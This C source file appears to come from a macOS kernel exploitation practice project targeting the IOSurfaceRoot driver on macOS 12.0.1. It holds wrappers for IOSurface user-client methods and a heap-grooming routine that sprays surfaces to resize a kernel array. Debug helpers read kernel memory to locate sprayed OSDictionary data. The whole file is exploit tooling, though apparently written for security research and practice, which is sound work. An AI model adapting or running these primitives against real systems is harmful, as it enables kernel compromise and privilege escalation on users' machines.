#include "IOSurfaceRoot.h"
#include "ENABLE_HELPER.h"
#include "print.h"
#include "helper/find_IOSurface.h"
#include "helper/kextrw.h"

// macOS 12.0.1 VMAPPLE; varies with version
// tip: find CMP W8, ... from IOSurfaceRootUserClient::lock_surface
#define IOSURFACE_CREATE_OUTSIZE 0xF60

mach_port_t IOSurfaceRootUserClient;
uint32_t IOSurface_id;

io_connect_t IOSurfaceRoot_init(void)
{
    kern_return_t IOMasterPort(mach_port_t, mach_port_t *);
    mach_port_t mp = MACH_PORT_NULL;
    IOMasterPort(MACH_PORT_NULL, &mp);
    io_connect_t uc;

    io_service_t s = IOServiceGetMatchingService(mp, IOServiceMatching("IOSurfaceRoot"));
    if (s == MACH_PORT_NULL)
    {
        printf("IOServiceGetMatchingService failed (IOSurfaceRoot)\n");
        while(1) {};
        return 0;
    }
    
    if (IOServiceOpen(s, mach_task_self(), 0, &uc) != KERN_SUCCESS)
    {
        printf("IOServiceOpen failed (IOSurfaceRoot)\n");
        while(1) {};
        return 0;
    }

    IOSurfaceRootUserClient = uc;
    printf("called IOSurfaceRoot_init, uc = 0x%x\n", uc);
    
    return uc;
}

void IOSurfaceRoot_exit(io_connect_t uc)
{
    IOServiceClose(uc);
}

uint32_t IOSurfaceRoot_create_surface_fast(io_connect_t uc)
{
    // Brandon Azad's definitions from https://bugs.chromium.org/p/project-zero/issues/detail?id=1986#c4
    struct _IOSurfaceFastCreateArgs {
        uint64_t address;
        uint32_t width;
        uint32_t height;
        uint32_t pixel_format;
        uint32_t bytes_per_element;
        uint32_t bytes_per_row;
        uint32_t alloc_size;
    };

    struct IOSurfaceLockResult {
        uint8_t _pad1[0x18];
        uint32_t surface_id;
        uint8_t _pad2[IOSURFACE_CREATE_OUTSIZE-0x18-0x4];
    };
    
    struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) 0x4000 };
    struct IOSurfaceLockResult lock_result = {0};
    uint64_t lock_result_size = sizeof(lock_result);
    
    IOConnectCallMethod(
            uc,
            6,
            NULL, 0,
            &create_args, sizeof(create_args),
            NULL, NULL,
            &lock_result, (size_t *)&lock_result_size);

    IOSurface_id = lock_result.surface_id;
    
    return lock_result.surface_id;
}

kern_return_t IOSurfaceRoot_lookup_surface(io_connect_t uc, uint32_t surf_id)
{
    uint64_t sz = IOSURFACE_CREATE_OUTSIZE;
    uint8_t o[IOSURFACE_CREATE_OUTSIZE];
    uint64_t scalarInput = surf_id;
    kern_return_t ret = IOConnectCallMethod(uc, 4, &scalarInput, 1, 0, 0, 0, 0, o, (size_t *)&sz);
    return ret;
}

kern_return_t IOSurfaceRoot_release_surface(io_connect_t uc, uint32_t surf_id)
{
    uint64_t scalarInput = surf_id;
    kern_return_t ret = IOConnectCallMethod(uc, 1, &scalarInput, 1, 0, 0, 0, 0, 0, 0);
    return ret;
}

void IOSurfaceRoot_release_all(io_connect_t uc)
{
    for (uint32_t surf_id = 1; surf_id < 0x3FFF; ++surf_id)
    {
        IOSurfaceRoot_release_surface(uc, surf_id);
    }
}

uint32_t IOSurfaceRoot_get_surface_use_count(io_connect_t uc, uint32_t surf_id)
{
    uint64_t scalarInput = surf_id;
    uint64_t output = 0;
    uint64_t outputCnt = 1;
    IOConnectCallMethod(uc, 16, &scalarInput, 1, 0, 0, &output, (uint32_t *)&outputCnt, 0, 0);

    return (uint32_t)output;
}

void IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(io_connect_t uc, uint32_t surf_id, uint64_t tile)
{
    uint64_t scalarInput[3];

    scalarInput[0] = surf_id;
    scalarInput[1] = 0;
    scalarInput[2] = tile;

    IOConnectCallScalarMethod(uc, 31, (uint64_t *)&scalarInput, 3, 0, 0);
}

#if ENABLE_HELPER
// OSArray stuffs
// OSObject_1 *__fastcall OSArray::getObject(const OSArray_1 *this, unsigned int index)
uint64_t OSArray_objectAtIndex(uint64_t array, int idx) {
    uint64_t array_buffer = kextrw_kreadptr(array + 0x20); // 0x20 = p/x offsetof(OSArray, array)
    return kextrw_kreadptr(array_buffer + idx * sizeof(uint64_t));
}

uint64_t OSData_buffer(uint64_t osdata) {
    return kextrw_kreadptr(osdata + 0x18);	// 0x18 = p/x offsetof(OSData, data)
}
#endif

uint32_t IOSurfaceRoot_cause_array_size_to_be_0x4000(void)
{
    for (int i = 0; i < 4; ++i)
    {
        io_connect_t uc = IOSurfaceRoot_init();
        printf("IOSurfaceRoot_cause_array_size_to_be_0x4000 uc = 0x%x\n", uc);
        for (int i = 0; i < 0xf00; ++i)
        {
            uint32_t last_id = IOSurfaceRoot_create_surface_fast(uc);
            printf("IOSurfaceRoot_cause_array_size_to_be_0x4000 last_id = 0x%x\n", last_id);
            
#if ENABLE_HELPER
            uint64_t userspaceValueDicts = userdict_from_IOSurface();
	        // INFO("IOSurface's userspaceValueDicts: 0x%llx\n", userspaceValueDicts);
            struct kOSDict *dict = kernel_fetch_dict(userspaceValueDicts);
            uint64_t osdict_entry = 0;

            // https://github.com/wh1te4ever/xnu_1day_practice/blob/main/CVE-2019-8605/IOSurface_kread_observe/main.c#L98
            for (int i = 0; i < dict->count; i++) {
		        if(dict->items[i].value) {
                    #if 0
                    uint64_t osarray = dict->items[i].value;
                    uint32_t osarray_count = kextrw_kread32(osarray + 0x14);	// 0x14 = p/x offsetof(OSArray, count)
                    uint32_t osarray_capacity = kextrw_kread32(osarray + 0x18);	// 0x18 = p/x offsetof(OSArray, capacity)

                    printf("osarray = 0x%llx, osarray_count = %u, osarray_capacity = %u\n", osarray, osarray_count, osarray_capacity);

                    for(int i = 0; i < osarray_count; i++) {
                        uint64_t osdata_in_osarray = OSArray_objectAtIndex(osarray, i);
		                uint64_t kbuffer = OSData_buffer(osdata_in_osarray);

                        printf("osdata_in_osarray = 0x%llx, kbuffer = 0x%llx\n", osdata_in_osarray, kbuffer);
                        // if(kbuffer !=0) {
                        //     kextrw_khexdump(kbuffer, 0x100);
                        // }
                    }
                    #endif

                    #if 1
                    uint32_t osdict_count = kextrw_kread32(dict->items[i].value + 0x14);   //off_osdictionary_count);
	                uint32_t osdict_capacity = kextrw_kread32(dict->items[i].value + 0x18);    //off_osdictionary_capacity);
                    osdict_entry = kextrw_kreadptr(dict->items[i].value + 0x20); //off_osdictionary_dictionary);

                    uint64_t osdictentry_key = kextrw_kreadptr(osdict_entry + 0);   //off_osdictentry_dict);  
                    uint64_t osdict_kbuffer = kextrw_kreadptr(osdictentry_key + 0x10);  //off_osstring_string);

                    INFO("OSDict from userspaceValueDicts[%u] = 0x%llx\n", i, dict->items[i].value);
                    INFO("osdict_count = 0x%x, osdict_capacity = 0x%x, osdict_entry = 0x%llx\n", osdict_count, osdict_capacity, osdict_entry);
                    INFO("osdictentry_key = 0x%llx\n", osdictentry_key);
                    if(osdict_kbuffer != 0)
                        INFO("osdict_kbuffer = 0x%llx -> 0x%x\n", osdict_kbuffer, kextrw_kread32(osdict_kbuffer));
                
                    // if(osdict_capacity == (82 MB / 0x10)) {
                    //     uint64_t osdictentry_key = kread64(osdict_entry + off_osdictentry_dict);  
                    //     uint64_t osdict_kbuffer = kread64(osdictentry_key + off_osstring_string);
                        
                    //     if(kread32(osdict_kbuffer) == 0xaabbcc) {
                    //         SUCCESS("Found our 1st sprayed IOSurface data!\n");
                    //         INFO("OSDict from userspaceValueDicts[%u] = 0x%llx\n", i, dict->items[i].value);
                    //         INFO("osdict_count = 0x%x, osdict_capacity = 0x%x, osdict_entry = 0x%llx\n", osdict_count, osdict_capacity, osdict_entry);
                    //         INFO("osdictentry_key = 0x%llx\n", osdictentry_key);
                    //         INFO("osdict_kbuffer = 0x%llx -> 0x%x\n", osdict_kbuffer, kread32(osdict_kbuffer));
                    //         break;
                    //     }
                    // }
                    #endif
	            }
            }
#endif

            if (0x3400 <= (last_id * sizeof(uint64_t)))
            {
                #if ENABLE_HELPER
                    puts("IOSurfaceRoot_cause_array_size_to_be_0x4000 end");
                    puts("============================================");
                #endif
                return last_id;
            }
        }
    }


    
    return -1;
}
